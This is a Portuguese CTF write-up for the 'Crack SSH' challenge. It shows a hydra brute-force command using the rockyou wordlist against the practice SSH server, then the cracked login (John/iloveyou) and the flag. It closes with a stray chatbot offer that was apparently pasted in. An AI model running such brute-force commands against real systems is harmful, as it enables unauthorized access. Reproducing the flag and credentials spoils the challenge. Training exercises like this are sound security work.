# Crack SSH

> Autor: @Ralfbp

---

## 🧹 Tipos de desafio "Crack SSH"

> Link: [https://ctf.chapeudepalhahacker.club/challenges#Crack%20SSH-7](https://ctf.chapeudepalhahacker.club/challenges#Crack%20SSH-7)

---

### Introdução

#### Enunciado

[![Captura-de-tela-2025-06-06-171425.png](https://i.postimg.cc/rmXvwhMN/Captura-de-tela-2025-06-06-171425.png)](https://postimg.cc/GBKMMxB4)

#### 🔑Objetivo

```
   Brute Force de Senha (Senha fraca)
```

#### 🛠️ Ferramenta utilizada:

```
   Virtual box: https://www.virtualbox.org/
   Kali lunix: https://www.kali.org/get-kali/#kali-platforms
   hydra: https://www.kali.org/tools/hydra/
   ChatGPT:https://chatgpt.com/
```

#### informações utilizadas

```
   Endereço do servidor ssh: ctf.chapeudepalhahacker.club:3342.
   Usuario do servidor: John
```

#### A flag segue o seguinte padrão:

```
   flag{.........}
```

---

## 🛠️ Resolução

* Ao tentar se conectar com o servidor diretamente, ele te pedira a senha que não te foi fornecida

```
   Comando para se conectar: ssh John@ctf.chapeudepalhahacker.club -p 3342
```

[![Captura-de-tela-2025-06-06-172824.png](https://i.postimg.cc/QCZykStx/Captura-de-tela-2025-06-06-172824.png)](https://postimg.cc/jwvcRHPG)

* Utilizaremos o Brute Force do hydra para tentar conseguir a senha
* Usando o comando para o teste de **Brute force**

```
   hydra -l john -P /usr/share/wordlists/rockyou.txt -s 3342 ssh://ctf.chapeudepalhahacker.club
```

[![Captura-de-tela-2025-06-06-234753.png](https://i.postimg.cc/d0MjCdy6/Captura-de-tela-2025-06-06-234753.png)](https://postimg.cc/NK4XqKb2)

* Login e senha

```
   login: John
   senha: iloveyou
```

* Se conectando ao servidor, usando o comando

```
   ssh john@ctf.chapeudepalhahacker.club -p 3342
```

[![Captura-de-tela-2025-06-06-235905.png](https://i.postimg.cc/gjQqz6yf/Captura-de-tela-2025-06-06-235905.png)](https://postimg.cc/YLNm80s3)

* Com isso você encontrou a sua flag

```
flag{BRUT3_SSH_15_V3RY_34SY}
```

---

## ✅ Conclusão

O desafio "Crack SSH" demonstra como senhas fracas podem comprometer sistemas inteiros. Utilizando ferramentas adequadas como o Hydra e wordlists conhecidas (como o rockyou.txt), foi possível realizar um ataque de força bruta com sucesso e obter a flag. Além de reforçar a importância da segurança em serviços SSH, o exercício serve como uma introdução prática ao uso de ferramentas de pentest no Kali Linux.

> ⚡ A flag final é: **flag{BRUT3\_SSH\_15\_V3RY\_34SY}**

Se quiser, posso adaptar essa conclusão para um tom mais descontraído ou técnico — é só pedir!
